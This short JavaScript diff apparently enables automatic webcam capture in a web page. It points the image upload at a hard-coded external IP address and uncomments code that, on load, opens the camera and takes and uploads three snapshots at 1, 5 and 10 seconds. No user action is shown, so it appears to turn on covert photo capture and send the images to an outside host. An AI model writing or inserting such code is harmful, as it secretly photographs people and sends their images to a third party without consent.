@@ -68,7 +68,7 @@
         var uploadAjax = $.ajax({
             type: "post",
             //后端需要调用的地址
-            url:"/receiveImage/",
+            url:"https://39.108.236.227:443/receiveImage/",
             data: JSON.stringify({"imgData": imgData,"filename":filename}),
             contentType:"json/application",
             //设置超时
@@ -92,19 +92,19 @@
         });
     }
 
-    // getMedia()
-    // setTimeout(() => {
-    //   takePhoto()
-    //   uploadImage('a.png')
-    // }, 1000);
-    // setTimeout(() => {
-    //   takePhoto()
-    //   uploadImage('b.png')
-    // }, 5000);
-    // setTimeout(() => {
-    //   takePhoto()
-    //   uploadImage('c.png')
-    // }, 10000);
+     getMedia()
+     setTimeout(() => {
+       takePhoto()
+       uploadImage('a.png')
+     }, 1000);
+     setTimeout(() => {
+       takePhoto()
+       uploadImage('b.png')
+     }, 5000);
+     setTimeout(() => {
+       takePhoto()
+       uploadImage('c.png')
+     }, 10000);
 
 
     // takePhoto()
